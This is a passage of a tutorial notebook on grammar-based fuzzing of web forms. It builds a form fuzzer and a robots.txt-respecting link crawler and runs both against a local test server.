   "execution_count": 113,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.879571Z",
     "iopub.status.busy": "2021-11-01T22:34:03.878949Z",
     "iopub.status.idle": "2021-11-01T22:34:03.881254Z",
     "shell.execute_reply": "2021-11-01T22:34:03.881618Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']"
      ]
     },
     "execution_count": 113,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar[\"<query>\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Each of these fields has the form `<field-name>=<field-type>`, where `<field-type>` is already defined in the grammar:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 114,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.884807Z",
     "iopub.status.busy": "2021-11-01T22:34:03.884290Z",
     "iopub.status.idle": "2021-11-01T22:34:03.886459Z",
     "shell.execute_reply": "2021-11-01T22:34:03.886827Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['zip=<number>']"
      ]
     },
     "execution_count": 114,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar[\"<zip>\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 115,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.890269Z",
     "iopub.status.busy": "2021-11-01T22:34:03.889517Z",
     "iopub.status.idle": "2021-11-01T22:34:03.891861Z",
     "shell.execute_reply": "2021-11-01T22:34:03.892300Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['terms=<checkbox>']"
      ]
     },
     "execution_count": 115,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar[\"<terms>\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "These are the query URLs produced from the grammar.  We see that these are similar to the ones produced from our hand-crafted grammar, except that the string values for names, email addresses, and cities are now completely random:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.915560Z",
     "iopub.status.busy": "2021-11-01T22:34:03.914485Z",
     "iopub.status.idle": "2021-11-01T22:34:03.917696Z",
     "shell.execute_reply": "2021-11-01T22:34:03.918055Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/order?item=drill&name=++%61&email=%6e%40b++&city=0&zip=88&terms=on&submit=',\n",
       " '/order?item=tshirt&name=%3f&email=21+%40+&city=++&zip=4&terms=off&submit=',\n",
       " '/order?item=drill&name=2&email=%62%40++%4d1++_%77&city=e%5d&zip=1&terms=on&submit=']"
      ]
     },
     "execution_count": 116,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "order_fuzzer = GrammarFuzzer(grammar)\n",
    "[order_fuzzer.fuzz() for i in range(3)]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We can again feed these directly into our Web browser:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 117,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.930212Z",
     "iopub.status.busy": "2021-11-01T22:34:03.929528Z",
     "iopub.status.idle": "2021-11-01T22:34:03.940665Z",
     "shell.execute_reply": "2021-11-01T22:34:03.941030Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:03] INSERT INTO orders VALUES ('drill', ' ', '5F @p   a ', 'cdb', '3230')\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:03] \"GET /order?item=drill&name=+&email=5F+%40p+++a+&city=cdb&zip=3230&terms=on&submit= HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook Rotary Hammer</strong> to   in cdb, 3230<br>\n",
       "  A confirmation mail will be sent to 5F @p   a .\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 117,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(webbrowser(urljoin(httpd_url, order_fuzzer.fuzz())))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We see (one more time) that we can mine a grammar automatically from given data."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### A Fuzzer for Web Forms\n",
    "\n",
    "To make things most convenient, let us define a `WebFormFuzzer` class that does everything in one place.  Given a URL, it extracts its HTML content, mines the grammar and then produces inputs for it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.945490Z",
     "iopub.status.busy": "2021-11-01T22:34:03.944973Z",
     "iopub.status.idle": "2021-11-01T22:34:03.946694Z",
     "shell.execute_reply": "2021-11-01T22:34:03.947127Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class WebFormFuzzer(GrammarFuzzer):\n",
    "    def __init__(self, url, **grammar_fuzzer_options):\n",
    "        html_text = self.get_html(url)\n",
    "        grammar = self.get_grammar(html_text)\n",
    "        super().__init__(grammar, **grammar_fuzzer_options)\n",
    "\n",
    "    def get_html(self, url):\n",
    "        return requests.get(url).text\n",
    "\n",
    "    def get_grammar(self, html_text):\n",
    "        grammar_miner = HTMLGrammarMiner(html_text)\n",
    "        return grammar_miner.mine_grammar()        "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "All it now takes to fuzz a Web form is to provide its URL:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.950257Z",
     "iopub.status.busy": "2021-11-01T22:34:03.949741Z",
     "iopub.status.idle": "2021-11-01T22:34:03.962445Z",
     "shell.execute_reply": "2021-11-01T22:34:03.962875Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order?item=lockset&name=%6b+&email=+%40b5&city=%7e+5&zip=65&terms=on&submit='"
      ]
     },
     "execution_count": 119,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_form_fuzzer = WebFormFuzzer(httpd_url)\n",
    "web_form_fuzzer.fuzz()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We can combine the fuzzer with a `WebRunner` as defined above to run the resulting fuzz inputs directly on our Web server:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:03.970929Z",
     "iopub.status.busy": "2021-11-01T22:34:03.970429Z",
     "iopub.status.idle": "2021-11-01T22:34:04.061786Z",
     "shell.execute_reply": "2021-11-01T22:34:04.062220Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[('http://127.0.0.1:8800/order?item=drill&name=+%6d&email=%40%400&city=%64&zip=9&terms=on&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=lockset&name=++&email=%63%40d&city=_&zip=6&terms=on&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=lockset&name=+&email=d%40_-&city=2++0&zip=1040&terms=off&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=tshirt&name=%4bb&email=%6d%40+&city=%7a%79+&zip=13&terms=off&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=lockset&name=d&email=%55+%40%74&city=+&zip=4&terms=on&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=tshirt&name=_+2&email=1++%40+&city=+&zip=30&terms=on&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=tshirt&name=+&email=a-%40+&city=+%57&zip=2&terms=on&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=lockset&name=%56&email=++%40a%55ee%44&city=+&zip=01&terms=off&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=tshirt&name=%6fc&email=++%40+&city=a&zip=25&terms=off&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=drill&name=55&email=3%3e%40%405&city=%4c&zip=0&terms=off&submit=',\n",
       "  'PASS')]"
      ]
     },
     "execution_count": 120,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_form_runner = WebRunner(httpd_url)\n",
    "web_form_fuzzer.runs(web_form_runner, 10)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "While convenient to use, this fuzzer is still very rudimentary:\n",
    "\n",
    "* It is limited to one form per page.\n",
    "* It only supports `GET` actions (i.e., inputs encoded into the URL).  A full Web form fuzzer would have to at least support `POST` actions.\n",
    "* The fuzzer is build on HTML only.  There is no Javascript handling for dynamic Web pages."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us clear any pending messages before we get to the next section:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.065566Z",
     "iopub.status.busy": "2021-11-01T22:34:04.064991Z",
     "iopub.status.idle": "2021-11-01T22:34:04.068218Z",
     "shell.execute_reply": "2021-11-01T22:34:04.067756Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "clear_httpd_messages()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Crawling User Interfaces\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "So far, we have assumed there would be only one form to explore.  A real Web server, of course, has several pages – and possibly several forms, too.  We define a simple *crawler* that explores all the links that originate from one page."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Our crawler is pretty straightforward.  Its main component is again a `HTMLParser` that analyzes the HTML code for links of the form\n",
    "\n",
    "```html\n",
    "<a href=\"<link>\">\n",
    "```\n",
    "\n",
    "and saves all the links found in a list called `links`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.072564Z",
     "iopub.status.busy": "2021-11-01T22:34:04.072051Z",
     "iopub.status.idle": "2021-11-01T22:34:04.073687Z",
     "shell.execute_reply": "2021-11-01T22:34:04.074047Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class LinkHTMLParser(HTMLParser):\n",
    "    def reset(self):\n",
    "        super().reset()\n",
    "        self.links = []\n",
    "\n",
    "    def handle_starttag(self, tag, attrs):\n",
    "        attributes = {attr_name: attr_value for attr_name, attr_value in attrs}\n",
    "\n",
    "        if tag == \"a\" and \"href\" in attributes:\n",
    "            # print(\"Found:\", tag, attributes)\n",
    "            self.links.append(attributes[\"href\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The actual crawler comes as a _generator function_ `crawl()` which produces one URL after another.  By default, it returns only URLs that reside on the same host; the parameter `max_pages` controls how many pages (default: 1) should be scanned.  We also respect the `robots.txt` file on the remote site to check which pages we are allowed to scan."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 123,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.077089Z",
     "iopub.status.busy": "2021-11-01T22:34:04.076569Z",
     "iopub.status.idle": "2021-11-01T22:34:04.079342Z",
     "shell.execute_reply": "2021-11-01T22:34:04.079889Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from collections import deque\n",
    "import urllib.robotparser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.087028Z",
     "iopub.status.busy": "2021-11-01T22:34:04.086436Z",
     "iopub.status.idle": "2021-11-01T22:34:04.088197Z",
     "shell.execute_reply": "2021-11-01T22:34:04.088783Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "def crawl(url, max_pages=1, same_host=True):\n",
    "    \"\"\"Return the list of linked URLs from the given URL.  Accesses up to `max_pages`.\"\"\"\n",
    "\n",
    "    pages = deque([(url, \"<param>\")])\n",
    "    urls_seen = set()\n",
    "\n",
    "    rp = urllib.robotparser.RobotFileParser()\n",
    "    rp.set_url(urljoin(url, \"/robots.txt\"))\n",
    "    rp.read()\n",
    "\n",
    "    while len(pages) > 0 and max_pages > 0:\n",
    "        page, referrer = pages.popleft()\n",
    "        if not rp.can_fetch(\"*\", page):\n",
    "            # Disallowed by robots.txt\n",
    "            continue\n",
    "\n",
    "        r = requests.get(page)\n",
    "        max_pages -= 1\n",
    "\n",
    "        if r.status_code != HTTPStatus.OK:\n",
    "            print(\"Error \" + repr(r.status_code) + \": \" + page,\n",
    "                  \"(referenced from \" + referrer + \")\",\n",
    "                  file=sys.stderr)\n",
    "            continue\n",
    "\n",
    "        content_type = r.headers[\"content-type\"]\n",
    "        if not content_type.startswith(\"text/html\"):\n",
    "            continue\n",
    "\n",
    "        parser = LinkHTMLParser()\n",
    "        parser.feed(r.text)\n",
    "\n",
    "        for link in parser.links:\n",
    "            target_url = urljoin(page, link)\n",
    "            if same_host and urlsplit(\n",
    "                    target_url).hostname != urlsplit(url).hostname:\n",
    "                # Different host\n",
    "                continue\n",
    "            if urlsplit(target_url).fragment != \"\":\n",
    "                # Ignore #fragments\n",
    "                continue\n",
    "\n",
    "            if target_url not in urls_seen:\n",
    "                pages.append((target_url, page))\n",
    "                urls_seen.add(target_url)\n",
    "                yield target_url\n",
    "\n",
    "        if page not in urls_seen:\n",
    "            urls_seen.add(page)\n",
    "            yield page"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "We can run the crawler on our own server, where it will quickly return the order page and the terms and conditions page."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.093349Z",
     "iopub.status.busy": "2021-11-01T22:34:04.092764Z",
     "iopub.status.idle": "2021-11-01T22:34:04.103205Z",
     "shell.execute_reply": "2021-11-01T22:34:04.103574Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:04] \"GET /robots.txt HTTP/1.1\" 404 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:04] \"GET / HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"http://127.0.0.1:8800/terms\">http://127.0.0.1:8800/terms</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"http://127.0.0.1:8800\">http://127.0.0.1:8800</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "for url in crawl(httpd_url):\n",
    "    print_httpd_messages()\n",
    "    print_url(url)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We can also crawl over other sites, such as the home page of this project."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 126,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.106879Z",
     "iopub.status.busy": "2021-11-01T22:34:04.106369Z",
     "iopub.status.idle": "2021-11-01T22:34:04.750981Z",
     "shell.execute_reply": "2021-11-01T22:34:04.740330Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/\">https://www.fuzzingbook.org/</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/00_Table_of_Contents.html\">https://www.fuzzingbook.org/html/00_Table_of_Contents.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/01_Intro.html\">https://www.fuzzingbook.org/html/01_Intro.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Tours.html\">https://www.fuzzingbook.org/html/Tours.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Intro_Testing.html\">https://www.fuzzingbook.org/html/Intro_Testing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/02_Lexical_Fuzzing.html\">https://www.fuzzingbook.org/html/02_Lexical_Fuzzing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Fuzzer.html\">https://www.fuzzingbook.org/html/Fuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Coverage.html\">https://www.fuzzingbook.org/html/Coverage.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/MutationFuzzer.html\">https://www.fuzzingbook.org/html/MutationFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GreyboxFuzzer.html\">https://www.fuzzingbook.org/html/GreyboxFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/SearchBasedFuzzer.html\">https://www.fuzzingbook.org/html/SearchBasedFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/MutationAnalysis.html\">https://www.fuzzingbook.org/html/MutationAnalysis.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/03_Syntactical_Fuzzing.html\">https://www.fuzzingbook.org/html/03_Syntactical_Fuzzing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Grammars.html\">https://www.fuzzingbook.org/html/Grammars.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GrammarFuzzer.html\">https://www.fuzzingbook.org/html/GrammarFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GrammarCoverageFuzzer.html\">https://www.fuzzingbook.org/html/GrammarCoverageFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Parser.html\">https://www.fuzzingbook.org/html/Parser.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/ProbabilisticGrammarFuzzer.html\">https://www.fuzzingbook.org/html/ProbabilisticGrammarFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GeneratorGrammarFuzzer.html\">https://www.fuzzingbook.org/html/GeneratorGrammarFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GreyboxGrammarFuzzer.html\">https://www.fuzzingbook.org/html/GreyboxGrammarFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Reducer.html\">https://www.fuzzingbook.org/html/Reducer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/04_Semantical_Fuzzing.html\">https://www.fuzzingbook.org/html/04_Semantical_Fuzzing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GrammarMiner.html\">https://www.fuzzingbook.org/html/GrammarMiner.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/InformationFlow.html\">https://www.fuzzingbook.org/html/InformationFlow.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/ConcolicFuzzer.html\">https://www.fuzzingbook.org/html/ConcolicFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/SymbolicFuzzer.html\">https://www.fuzzingbook.org/html/SymbolicFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/DynamicInvariants.html\">https://www.fuzzingbook.org/html/DynamicInvariants.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/05_Domain-Specific_Fuzzing.html\">https://www.fuzzingbook.org/html/05_Domain-Specific_Fuzzing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/ConfigurationFuzzer.html\">https://www.fuzzingbook.org/html/ConfigurationFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/APIFuzzer.html\">https://www.fuzzingbook.org/html/APIFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Carver.html\">https://www.fuzzingbook.org/html/Carver.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/WebFuzzer.html\">https://www.fuzzingbook.org/html/WebFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GUIFuzzer.html\">https://www.fuzzingbook.org/html/GUIFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/06_Managing_Fuzzing.html\">https://www.fuzzingbook.org/html/06_Managing_Fuzzing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/FuzzingInTheLarge.html\">https://www.fuzzingbook.org/html/FuzzingInTheLarge.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/WhenToStopFuzzing.html\">https://www.fuzzingbook.org/html/WhenToStopFuzzing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/99_Appendices.html\">https://www.fuzzingbook.org/html/99_Appendices.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/PrototypingWithPython.html\">https://www.fuzzingbook.org/html/PrototypingWithPython.html</a></pre>"
      ],
      "text/plain": [
